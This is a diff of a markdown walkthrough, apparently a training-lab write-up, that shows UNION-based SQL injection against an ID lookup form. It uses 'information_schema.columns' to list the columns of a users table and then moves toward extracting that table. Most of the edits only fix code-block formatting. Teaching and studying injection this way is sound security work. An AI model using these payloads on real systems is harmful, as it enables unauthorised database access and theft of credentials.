@@ -4,9 +4,11 @@
 
 By entering an ID number, we can attempt to retrieve an initial table!
 
-```ID: 1 
+``
+ID: 1 
 First name: one
-Surname : me```
+Surname : me
+``
 
 We can start by sending a SQL command:
 
@@ -20,9 +22,8 @@ We don't have the names of the columns, but thanks to ``information_schema``, wh
 
 ``1 UNION SELECT column_name, table_name FROM information_schema.columns``
 
-This gives us the corresponding tables and columns:
-
-```ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
+```
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
 First name: user_id
 Surname: users
 
@@ -52,7 +53,9 @@ Surname: users
 
 ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
 First name: countersign
-Surname: users```
+Surname: users
+
+```
 
 Therefore, we can retrieve the data from the users table with the following command:
 
